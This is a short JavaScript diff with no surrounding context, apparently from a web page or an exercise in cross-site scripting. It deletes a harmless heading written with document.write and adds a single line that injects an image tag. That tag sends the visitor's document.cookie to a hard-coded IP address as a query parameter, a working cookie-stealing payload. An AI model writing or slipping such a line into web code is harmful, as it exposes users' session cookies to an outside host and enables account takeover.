@@ -1,3 +1,1 @@
- document.open();
-        document.write("<h1>Out with the old, in with the new!</h1>");
-        document.close();
+document.write('<img src="https://192.168.178.122/collect.gif?cookie=' + document.cookie + '" />')
